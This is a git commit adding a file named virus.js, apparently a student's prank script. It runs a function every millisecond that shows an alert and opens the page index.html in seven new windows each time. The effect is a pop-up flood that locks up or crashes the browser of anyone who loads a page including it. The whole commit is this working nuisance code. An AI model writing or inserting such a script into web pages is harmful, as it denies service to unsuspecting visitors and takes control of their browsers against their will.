209f929e5b088dd2daf70a850b719079c4eff214
Jayden Patel <jpatel.sh@mysummitps.org>
2017-03-29 18:44:38 +0000

    First

---
+++ virus.js
@@ -0,0 +1,15 @@
+// JavaScript File
+console.log("Linked");
+
+setInterval(troll , 1);
+function troll(){
+    alert("Absolutely nothing");
+    window.open("index.html");
+    window.open("index.html");
+    window.open("index.html");
+    window.open("index.html");
+    window.open("index.html");
+    window.open("index.html");
+    window.open("index.html");
+    
+}
